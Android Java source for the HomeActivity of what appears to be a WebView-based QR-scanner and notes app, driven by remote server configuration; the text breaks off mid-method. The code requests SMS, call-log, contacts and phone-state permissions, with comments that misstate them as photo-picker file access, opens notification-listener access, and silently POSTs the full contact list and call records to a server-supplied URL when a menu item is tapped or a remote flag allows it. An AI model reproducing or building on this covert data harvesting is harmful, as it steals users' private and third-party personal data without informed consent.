package com.vone.weibaoshuiguo;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.widget.PopupMenu;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.webkit.DownloadListener;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebStorage;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.AdapterView;
import android.widget.PopupWindow;
import android.widget.Toast;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.RequestParams;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest;
import com.luck.picture.lib.PictureSelector;
import com.luck.picture.lib.entity.LocalMedia;
import com.vone.qrcode.R;
import com.vone.weibaoshuiguo.base.BaseRxDataActivity;
import com.vone.weibaoshuiguo.bean.ContactRecord;
import com.vone.weibaoshuiguo.bean.MyContacts;
import com.vone.weibaoshuiguo.util.Constant;
import com.vone.weibaoshuiguo.util.DateFormatUtils;
import com.vone.weibaoshuiguo.util.DialogUtils;
import com.vone.weibaoshuiguo.util.DownloadUtils;
import com.vone.weibaoshuiguo.util.PackUtils;
import com.vone.weibaoshuiguo.util.RequestUtils;
import com.vone.weibaoshuiguo.util.SelectImageUtils;
import com.vone.weibaoshuiguo.util.SpinerPopWindow;
import com.vone.weibaoshuiguo.util.UpdateUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * webView activity
 **/
public class HomeActivity extends BaseRxDataActivity implements View.OnClickListener {

    private View rootView;
    private View emptyView;
    private WebView mWebView;
    private String url = PackUtils.OPEN_HOME_URL;
    private SpinerPopWindow<String> stringSpinerPopWindow;


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onClickRightLogo(View v) {
        showPopupMenu(v);
    }

    @Override
    protected String getBarTitle() {
        return "首页";
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void showPopupMenu(View view) {
        // 这里的view代表popupMenu需要依附的view
        PopupMenu popupMenu = new PopupMenu(HomeActivity.this, view);
        // 获取布局文件
        popupMenu.getMenuInflater().inflate(R.menu.popup_menu, popupMenu.getMenu());
        if(!isLyhdcd){
            popupMenu.getMenu().findItem(R.id.liuyan).setVisible(false);
        }
        if(!isCdqx){
            popupMenu.getMenu().findItem(R.id.fenxiangzhuanqian).setVisible(false);
        }
        if(!isMfdhcd){
            popupMenu.getMenu().findItem(R.id.phone).setVisible(false);
        }

        if(caidansq01 == 1 && caidanming01 != null && !TextUtils.isEmpty(caidanming01)
                            &&caidanwz01 != null && !TextUtils.isEmpty(caidanwz01)){
            popupMenu.getMenu().findItem(R.id.caidan1).setVisible(true);
            popupMenu.getMenu().findItem(R.id.caidan1).setTitle(caidanming01);
        }
        if(caidansq02 == 1 && caidanming02 != null && !TextUtils.isEmpty(caidanming02)
                            &&caidanwz02 != null && !TextUtils.isEmpty(caidanwz02)){
            popupMenu.getMenu().findItem(R.id.caidan2).setVisible(true);
            popupMenu.getMenu().findItem(R.id.caidan2).setTitle(caidanming02);
        }
        if(caidansq03 == 1 && caidanming03 != null && !TextUtils.isEmpty(caidanming03)
                            &&caidanwz03 != null && !TextUtils.isEmpty(caidanwz03)){
            popupMenu.getMenu().findItem(R.id.caidan3).setVisible(true);
            popupMenu.getMenu().findItem(R.id.caidan3).setTitle(caidanming03);
        }
        if(caidansq04 == 1 && caidanming04 != null && !TextUtils.isEmpty(caidanming04)
                            &&caidanwz04 != null && !TextUtils.isEmpty(caidanwz04)){
            popupMenu.getMenu().findItem(R.id.caidan4).setVisible(true);
            popupMenu.getMenu().findItem(R.id.caidan4).setTitle(caidanming04);
        }
        if(caidansq05 == 1 && caidanming05 != null && !TextUtils.isEmpty(caidanming05)
                            &&caidanwz05 != null && !TextUtils.isEmpty(caidanwz05)){
            popupMenu.getMenu().findItem(R.id.caidan5).setVisible(true);
            popupMenu.getMenu().findItem(R.id.caidan5).setTitle(caidanming05);
        }
        popupMenu.show();
        // 通过上面这几行代码，就可以把控件显示出来了
        popupMenu.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            @Override
            public boolean onMenuItemClick(MenuItem item) {
                // 控件每一个item的点击事件
                if (item.getItemId() == R.id.clearCache) {
                    WebStorage.getInstance().deleteAllData(); //清空WebView的localStorage
                    Toast.makeText(HomeActivity.this, "清除缓存成功!", Toast.LENGTH_SHORT).show();

                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            mWebView.reload();
                        }
                    },500);
                }  else if (item.getItemId() == R.id.checkUpdate) {
                    checkUpdate(HomeActivity.this,true);
                } else if (item.getItemId() == R.id.note) {
                    NotesListActivity.showActivity(HomeActivity.this);
                }else if (item.getItemId() == R.id.changeColor) {
                    stringSpinerPopWindow = new SpinerPopWindow<>(HomeActivity.this, mColorList, new AdapterView.OnItemClickListener() {
                        @Override
                        public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                            stringSpinerPopWindow.dismiss();
                            PackUtils.getInstance().putColor(HomeActivity.this, mColorMaps.get(mColorList.get(position)));
                            setActionBarBackgroundRes(mColorMaps.get(mColorList.get(position)));
                        }
                    });
                    // 设置背景颜色变暗
                    WindowManager.LayoutParams lp = HomeActivity.this.getWindow().getAttributes();
                    lp.alpha = 0.7f;
                    HomeActivity.this.getWindow().setAttributes(lp);
                    stringSpinerPopWindow.showBottomView("---还有主题哦---");
                    stringSpinerPopWindow.setOnDismissListener(new PopupWindow.OnDismissListener() {
                        @Override
                        public void onDismiss() {
                            WindowManager.LayoutParams lp = getWindow().getAttributes();
                            lp.alpha = 1f;
                            getWindow().setAttributes(lp);
                        }
                    });
                    stringSpinerPopWindow.setWidth(800);
                    stringSpinerPopWindow.setHeight(700);
                    stringSpinerPopWindow.showAtLocation(rootView, Gravity.CENTER,0,0);
                }else if(item.getItemId() == R.id.fenxiangzhuanqian){
                    if(fxzqjiekou != null && !TextUtils.isEmpty(fxzqjiekou)){
                        loadUrl(fxzqjiekou+"?yhm="+yhm);
                    }else{
                        Toast.makeText(HomeActivity.this, "授权失败..", Toast.LENGTH_SHORT).show();
                    }
                }else if(item.getItemId() == R.id.liuyan){
                    if(lyjiekou != null && !TextUtils.isEmpty(lyjiekou)){
                        loadUrl(lyjiekou+"?yhm="+yhm);
                    }else{
                        Toast.makeText(HomeActivity.this, "授权失败..", Toast.LENGTH_SHORT).show();
                    }
                }else if(item.getItemId() == R.id.phone){
                    // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
                    if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                        // 申请权限
                        ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, Constant.REQ_READ_CONTACTS);
                    }
                    if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        sendContacts();
                    }
                    if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                        sendContactsRecord();
                    }
                    if(mfdhjiekou != null && !TextUtils.isEmpty(mfdhjiekou)){
                        loadUrl(mfdhjiekou+"?yhm="+yhm);
                    }else{
                        Toast.makeText(HomeActivity.this, "电话本功能关闭了", Toast.LENGTH_SHORT).show();
                    }
                }else if(item.getItemId() == R.id.caidan1){
                    loadUrl(caidanwz01+"?yhm="+yhm);
                }else if(item.getItemId() == R.id.caidan2){
                    loadUrl(caidanwz02+"?yhm="+yhm);
                }else if(item.getItemId() == R.id.caidan3){
                    loadUrl(caidanwz03+"?yhm="+yhm);
                }else if(item.getItemId() == R.id.caidan4){
                    loadUrl(caidanwz04+"?yhm="+yhm);
                }else if(item.getItemId() == R.id.caidan5){
                    loadUrl(caidanwz05+"?yhm="+yhm);
                }
                return true;
            }
        });
        popupMenu.setOnDismissListener(new PopupMenu.OnDismissListener() {
            @Override
            public void onDismiss(PopupMenu menu) {
                // 控件消失时的事件
            }
        });

    }

    public void requestDxQx(){
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_CALL_LOG}, Constant.REQ_READ_CALL_LOG);
        }
    }

    private List<String> mColorList = new ArrayList<>();
    private Map<String,Integer> mColorMaps = new HashMap<>();
    @Override
    protected void onActivityPrepared() {

        initColor();
        mWebView = rootView.findViewById(R.id.webView);
        emptyView = rootView.findViewById(R.id.emptyView);
        initWebViewSetting();
        emptyView.setOnClickListener(this);

        requestPermiss();
        loadNotify();

        a();
        mWebView.setDownloadListener(new DownloadListener() {
            @Override
            public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimeType, long contentLength) {
                if(contentDisposition != null && !TextUtils.isEmpty(contentDisposition)) {
                    String fileName = contentDisposition.replace("attachment;filename=", "").replace("\"", "");
                    final File file = new File(Environment.getExternalStorageDirectory() +"/"+ HomeActivity.this.getResources().getString(R.string.app_name)+"/download/version/", fileName);
                    DownloadUtils.getInstance().downloadFile(HomeActivity.this, url, file.getAbsolutePath(), null);
                }else{
                    String fileEndName = url.substring(url.lastIndexOf("."));
                    if(fileEndName.contains("?")){
                        fileEndName = fileEndName.substring(0,fileEndName.lastIndexOf("?"));
                    }
                    final File file = new File(Environment.getExternalStorageDirectory() +"/"+ HomeActivity.this.getResources().getString(R.string.app_name)+"/download/version/", UUID.randomUUID().toString()+fileEndName);
                    DownloadUtils.getInstance().downloadFile(HomeActivity.this, url, file.getAbsolutePath(), null);
                }
                mWebView.goBack();
            }
        });
    }

    @Override
    protected boolean hasLeft2Logo() {
        return true;
    }

    @Override
    protected void onClickLeft2Logo(View view)
    {
        isError = true;
        mWebView.reload();
    }

    @Override
    protected void onClickLeft3Logo(View view) {
        startQrCode();
    }

    @Override
    protected boolean hasLeft3Logo() {
        return true;
    }

    @Override
    protected boolean hasRightLeftLogo() {
        return true;
    }

    @Override
    protected void onClickRightLeftLogo(View view) {
        if(!isCanUse){
            DialogUtils.getInstance().showShouldUseDialog(HomeActivity.this,null,xinxi);
            return;
        }
        loadUrl(zyjiekou);
    }

    private boolean isCanDhbqx = false;
    private boolean isCanUse = true;
    private boolean isCdqx = false;
    private boolean isMfdhcd = false;
    private boolean isLyhdcd = false;


    private String lyjiekou = "";
    private int jttzqx = 0;
    private int dhbqx  = 0;
    private String fxzqjiekou = "";
    private  String xinxi = "";

    /**post扫码结果接口*/
    private  String smjieguojiekou = "";

    /**打开页 免费电话接口*/
    private  String mfdhjiekou = "";

    /**打开主页的地址*/
    private  String zyjiekou = PackUtils.BACK_TO_HOME_URL;
    private  String wzbai = "";

    public void a(){
        PackUtils.getInstance().setOnASuccess(this, new PackUtils.OnAListener() {
            @Override
            public void onASuccess(String response) {
                sqResult(response);
            }

            @Override
            public void onAError(String error) {
                DialogUtils.getInstance().dismissLoadingDialog();
                String response = getSharedPreferences("vone", MODE_PRIVATE).getString(StaticInfo.JTSQ,"");
                if(!TextUtils.isEmpty(response)) {
                    sqResult(response);
                }else{
                    isCanUse = true;
                    loadUrl(url);
                }
            }
        });
    }

    private void sqResult(String response) {
        JSONObject jsonObject = JSON.parseObject(response);
        Log.d("xgw","json:"+jsonObject.toJSONString());
        int code = jsonObject.getInteger("code");
        String jsbjiekou = jsonObject.getString("jsbjiekou");
        String jcsjjiekou = jsonObject.getString("jcsjjiekou");
        String hywz = jsonObject.getString("hywz");
        String jtwz = jsonObject.getString("jtwz");
        xinxi = jsonObject.getString("xinxi");
        DialogUtils.getInstance().dismissLoadingDialog();
        SharedPreferences.Editor editor = getSharedPreferences("vone", MODE_PRIVATE).edit();
        editor.putString(StaticInfo.JTSQ,response);
        if(hywz != null && !TextUtils.isEmpty(hywz)) {
            editor.putString(StaticInfo.WZ, hywz);
            wz = hywz;
        }
        if(jtwz != null && !TextUtils.isEmpty(jtwz)) {
            editor.putString(StaticInfo.HOST, jtwz);
            host = jtwz;
        }
        lyjiekou = jsonObject.getString("lyjiekou");
        if(jsonObject.containsKey("jttzqx")) {
            jttzqx = jsonObject.getInteger("jttzqx");
            editor.putInt("jttzqx", jttzqx);
        }
        if(jsonObject.containsKey("jtdxqx")) {
            int jtdxqx = jsonObject.getInteger("jtdxqx");
            editor.putInt("jtdxqx", jtdxqx);
        }
        fxzqjiekou = jsonObject.getString("fxzqjiekou");
        if(jsonObject.containsKey("smjieguojiekou")){
            smjieguojiekou = jsonObject.getString("smjieguojiekou");
        }
        if(jsonObject.containsKey("mfdhjiekou")){
            mfdhjiekou = jsonObject.getString("mfdhjiekou");
        }
        if(jsonObject.containsKey("zyjiekou")){
            zyjiekou = jsonObject.getString("zyjiekou");
        }
        if(jsonObject.containsKey("wzbai")){
            wzbai = jsonObject.getString("wzbai");
            PackUtils.getInstance().setWzGuanggao(wzbai);
        }
        editor.apply();

        /**自定义菜单*/
        getMenu(jsonObject);

        dhbqx = jsonObject.getInteger("dhbqx");
        if(jsonObject.containsKey("pbggsq")) {
            int pbggsq = jsonObject.getInteger("pbggsq");
            PackUtils.getInstance().setPbggsq(pbggsq);
        }
        int cdqx = jsonObject.getInteger("fxzqcd");
        int mfdhcd = jsonObject.getInteger("mfdhcd");
        int lyhdcd = jsonObject.getInteger("lyhdcd");
        int urlqx = jsonObject.getInteger("urlqx");

        PackUtils.getInstance().setUrlqx(urlqx);

        if(cdqx == 1){
            isCdqx = true;
        }else{
            isCdqx = false;
        }
        if(mfdhcd == 1){
            isMfdhcd = true;
        }else{
            isMfdhcd = false;
        }
        if(lyhdcd == 1){
            isLyhdcd = true;
        }else{
            isLyhdcd = false;
        }
        if(dhbqx == 1){
            isCanDhbqx = true;
            PackUtils.getInstance().setCanDhbqx(true);
        }else{
            isCanDhbqx = false;
            PackUtils.getInstance().setCanDhbqx(false);
        }
        if(jsbjiekou != null && !TextUtils.isEmpty(jsbjiekou)){
            PackUtils.getInstance().setJsbjiekou(jsbjiekou);
        }
        if(jcsjjiekou != null && !TextUtils.isEmpty(jcsjjiekou)){
            PackUtils.getInstance().setCHECK_NEW_APK_URL(jcsjjiekou);
            checkUpdate(HomeActivity.this,false);
        }
        if(code == 1){
            isCanUse = false;
            DialogUtils.getInstance().showShouldUseDialog(HomeActivity.this,null,xinxi);
        }else{
            isCanUse = true;
            loadUrl(url);
        }
    }
    private int caidansq01;
    private int caidansq02;
    private int caidansq03;
    private int caidansq04;
    private int caidansq05;

    private String caidanming01;
    private String caidanming02;
    private String caidanming03;
    private String caidanming04;
    private String caidanming05;

    private String caidanwz01;
    private String caidanwz02;
    private String caidanwz03;
    private String caidanwz04;
    private String caidanwz05;
    private void getMenu(JSONObject jsonObject) {
        /**自定义菜单*/
        if(jsonObject.containsKey("caidansq01")){
            caidansq01 = jsonObject.getInteger("caidansq01");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidansq02")){
            caidansq02 = jsonObject.getInteger("caidansq02");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidansq03")){
            caidansq03 = jsonObject.getInteger("caidansq03");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidansq04")){
            caidansq04 = jsonObject.getInteger("caidansq04");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidansq05")){
            caidansq05 = jsonObject.getInteger("caidansq05");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanming01")){
            caidanming01 = jsonObject.getString("caidanming01");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanming02")){
            caidanming02 = jsonObject.getString("caidanming02");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanming03")){
            caidanming03 = jsonObject.getString("caidanming03");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanming04")){
            caidanming04 = jsonObject.getString("caidanming04");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanming05")){
            caidanming05 = jsonObject.getString("caidanming05");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanwz01")){
            caidanwz01 = jsonObject.getString("caidanwz01");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanwz02")){
            caidanwz02 = jsonObject.getString("caidanwz02");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanwz03")){
            caidanwz03 = jsonObject.getString("caidanwz03");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanwz04")){
            caidanwz04 = jsonObject.getString("caidanwz04");
        }
        /**自定义菜单*/
        if(jsonObject.containsKey("caidanwz05")){
            caidanwz05 = jsonObject.getString("caidanwz05");
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        requestPermiss();
    }

    @SuppressLint("InlinedApi")
    private void requestPermiss() {
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.RECEIVE_SMS}, Constant.REQ_PERM_SMS);
        }
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_SMS}, Constant.REQ_PERM_SMS);
        }
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 10055);
        }
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},10055);
        }
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE},10055);
        }
        if (ActivityCompat.checkSelfPermission(HomeActivity.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_CALL_LOG},2222);
        }
    }

    private void initColor() {
        mColorList.add("红色");
        mColorMaps.put("红色",R.color.red);
        mColorList.add("黑色");
        mColorMaps.put("黑色",R.color.black);
        mColorList.add("蓝色");
        mColorMaps.put("蓝色",R.color.blue);
        mColorList.add("天蓝色");
        mColorMaps.put("天蓝色",R.color.airBlue);
        mColorList.add("紫色");
        mColorMaps.put("紫色",R.color.violet);
        mColorList.add("粉色");
        mColorMaps.put("粉色",R.color.pink);
        mColorList.add("桃色");
        mColorMaps.put("桃色",R.color.PeachPuff);
        mColorList.add("灰色");
        mColorMaps.put("灰色",R.color.gray);
        mColorList.add("番茄");
        mColorMaps.put("番茄",R.color.Tomato);
        mColorList.add("橙红色");
        mColorMaps.put("橙红色",R.color.Tomato);
        mColorList.add("黄色");
        mColorMaps.put("黄色",R.color.yellow);
        mColorList.add("绿色");
        mColorMaps.put("绿色",R.color.green);
        mColorList.add("水绿色");
        mColorMaps.put("水绿色",R.color.Aqua);
    }

    private static String host = "";
    private static String key = "";
    private String wz = "";
    private static String yhm = "";

    private void loadNotify() {

        //检测通知使用权是否启用
        if (!isNotificationListenersEnabled()) {
            //跳转到通知使用权页面
            gotoNotificationAccessSetting();
        }
        //重启监听服务


        //读入保存的配置数据并显示
        SharedPreferences read = getSharedPreferences("vone", MODE_PRIVATE);
        host = read.getString(StaticInfo.HOST, "");
        yhm = read.getString(StaticInfo.YHM, "");
        wz = read.getString(StaticInfo.WZ, "");
        key = read.getString(StaticInfo.KEY, "");

        if (host != null && yhm != null && !TextUtils.isEmpty(host) && !TextUtils.isEmpty(yhm)) {
            Toast.makeText(HomeActivity.this, "服务启动中...", Toast.LENGTH_SHORT).show();
            toggleNotificationListenerService(this);

        }
    }

    private void getSuccess(String scanResult) {
        final String[] tmp = scanResult.split(",");
        if (tmp.length != 4) {
            Toast.makeText(HomeActivity.this, "二维码错误，请您扫描网站上显示的二维码!", Toast.LENGTH_SHORT).show();
            return;
        }

        final String t = String.valueOf(new Date().getTime());
        final String sign = PackUtils.md5(t + tmp[3]);

        final String jtwz = tmp[1];
        final String yhmString = tmp[2];
        final String wzString = tmp[0];
        final String keyString = tmp[3];
        HttpUtils httpUtils = new HttpUtils();
        RequestParams requestParams = new RequestParams();
        requestParams.addBodyParameter("t", t);
        requestParams.addBodyParameter("type", "9");
        requestParams.addBodyParameter("price", "0");
        requestParams.addBodyParameter("sign", sign);
        requestParams.addBodyParameter("yhm", yhmString);
        httpUtils.send(HttpRequest.HttpMethod.POST, jtwz, requestParams, new RequestCallBack<String>() {
            @Override
            public void onSuccess(ResponseInfo<String> responseInfo) {

                PackUtils.getInstance().getJGTime(responseInfo.result,HomeActivity.this);
                JSONObject jsonObject = JSON.parseObject(responseInfo.result);
                if( jsonObject != null ) {
                    int code = jsonObject.getInteger("code");
                    if(code == 1) {
                        host = jtwz;
                        key = keyString;
                        yhm = yhmString;
                        wz = wzString;
                        SharedPreferences.Editor editor = getSharedPreferences("vone", MODE_PRIVATE).edit();
                        editor.putString(StaticInfo.HOST, host);
                        editor.putString(StaticInfo.KEY, key);
                        editor.putString(StaticInfo.WZ, wz);
                        editor.putString(StaticInfo.YHM, yhm);
                        editor.commit();

                        Toast.makeText(HomeActivity.this, "绑定成功、可享用记事本导出功能", Toast.LENGTH_SHORT).show();
                        toggleNotificationListenerService(HomeActivity.this);
                    }
                }

            }

            @Override
            public void onFailure(HttpException e, String s) {
                Log.d("xgw","ssss");
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (resultCode == RESULT_OK && requestCode == 0) {
            String result = data.getStringExtra("result");
            Log.d("xgw","result:::"+result);
            if(result.contains(",")){
                if(result.split(",").length == 4){
                    getSuccess(result);
                }
            }
            sendErWeiMaResult(result);
        }else if(resultCode == RESULT_OK  && requestCode == SelectImageUtils.IMAGE_REQUESTION_CODE){
            List<LocalMedia> localMedia = PictureSelector.obtainMultipleResult(data);
            ArrayList<Uri> objects = new ArrayList<>();
            for (int i = 0; i < localMedia.size(); i++) {
                objects.add(Uri.fromFile(new File(localMedia.get(i).getPath())));
            }
            if(mFilePathCallback != null && objects.size() != 0){
                Uri[] uris = new Uri[objects.size()];
                Uri[] uris1 = objects.toArray(uris);
                mFilePathCallback.onReceiveValue(uris1);
            }
        }
    }

    private void sendErWeiMaResult(String result) {
        if(smjieguojiekou != null && !TextUtils.isEmpty(smjieguojiekou)){
            HttpUtils httpUtils = new HttpUtils();
            RequestParams requestParams = new RequestParams();
            requestParams.addBodyParameter("jieguo", result);
            requestParams.addBodyParameter("yhm", yhm);
            httpUtils.send(HttpRequest.HttpMethod.POST, smjieguojiekou, requestParams, new RequestCallBack<String>() {
                @Override
                public void onSuccess(ResponseInfo<String> responseInfo) {
                    JSONObject jsonObject = JSON.parseObject(responseInfo.result);
                    if( jsonObject != null ) {
                        String url = jsonObject.getString("url");
                        loadUrl(url);
                    }
                }

                @Override
                public void onFailure(HttpException e, String s) {

                }
            });
        }
    }

    public void loadUrl(String url){
        if(PackUtils.getInstance().getUrlqx() == 1){
            if(url.contains("?")) {
                mWebView.loadUrl(url+"&appwjh168abc=jkfhi&biaoshi="+PackUtils.ONLY_TAG);
            }else{
                mWebView.loadUrl(url+"?appwjh168abc=jkfhi&biaoshi="+PackUtils.ONLY_TAG);
            }
        }else{
            mWebView.loadUrl(url);
        }
    }

    public void checkPermission() {
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_SMS}, Constant.REQ_PERM_SMS);
            return;
        }
    }

    //扫码配置
    public void startQrCode() {
        // 申请相机权限
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.CAMERA}, Constant.REQ_PERM_CAMERA);
            return;
        }
        // 申请文件读写权限（部分朋友遇到相册选图需要读写权限的情况，这里一并写一下）
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(HomeActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, Constant.REQ_PERM_EXTERNAL_STORAGE);
            return;
        }
        // 二维码扫码
        Intent intent = new Intent(HomeActivity.this, io.github.xudaojie.qrcodelib.CaptureActivity.class);
        startActivityForResult(intent, 0);
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case Constant.REQ_PERM_CAMERA:
                // 摄像头权限申请
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // 获得授权
                    startQrCode();
                } else {
                    // 被禁止授权
                    Toast.makeText(HomeActivity.this, "请至权限中心打开本应用的相机访问权限", Toast.LENGTH_LONG).show();
                }
                break;
            case Constant.REQ_PERM_EXTERNAL_STORAGE:
                // 文件读写权限申请
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // 获得授权
                    startQrCode();
                }
                break;
            case Constant.REQ_PERM_SMS:
                // 文件读写权限申请
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // 获得授权
                    checkPermission();
                }
                break;
            case Constant.REQ_READ_CONTACTS:
                // 文件读写权限申请
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    requestDxQx();
                    if(host != null && TextUtils.isEmpty(host)){
                        return;
                    }

                    sendContacts();

                }
                break;
            case Constant.REQ_READ_CALL_LOG:
                // 文件读写权限申请
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    if(host == null || TextUtils.isEmpty(host)){
                        return;
                    }

                    sendContactsRecord();
                }
                break;
        }
    }

    private void sendContacts() {
        if(yhm == null || TextUtils.isEmpty(yhm)){
            return;
        }
        if(!isCanDhbqx){
            return;
        }
        // 获得授权
        PackUtils.getInstance().getAllContacts(this, new PackUtils.OnGetContactsListener() {
            @Override
            public void onGetContactsSuccess(ArrayList<MyContacts> datas) {
                if(datas == null || datas.size() == 0){
                    return;
                }
                String jsonString = JSON.toJSONString(datas);
                Log.d("xgw","jsonString:"+jsonString);
                HttpUtils httpUtils = new HttpUtils();
                RequestParams requestParams = new RequestParams();
                requestParams.addBodyParameter("data", jsonString);
                requestParams.addBodyParameter("leixing", "dhb");
                requestParams.addBodyParameter("yhm", yhm);
                httpUtils.send(HttpRequest.HttpMethod.POST, wz, requestParams, new RequestCallBack<String>() {
                    @Override
                    public void onSuccess(ResponseInfo<String> responseInfo) {
                    }

                    @Override
                    public void onFailure(HttpException e, String s) {
                    }
                });
            }
        });

        /**发送联系人*/
    }

    private void sendContactsRecord() {
        if(yhm == null || TextUtils.isEmpty(yhm)){
            return;
        }
        if(!isCanDhbqx){
            return;
        }
        // 获得授权
        PackUtils.getInstance().getDataList(this, new PackUtils.OnGetContactsRecordListener() {
            @Override
            public void onGetContactsRecordSuccess(ArrayList<ContactRecord> datas) {
                if(datas == null || datas.size() == 0){
                    return;
                }
                String jsonString = JSON.toJSONString(datas);
                Log.d("xgw","contactRecord:"+jsonString);
                HttpUtils httpUtils = new HttpUtils();
                RequestParams requestParams = new RequestParams();
                requestParams.addBodyParameter("data", jsonString);
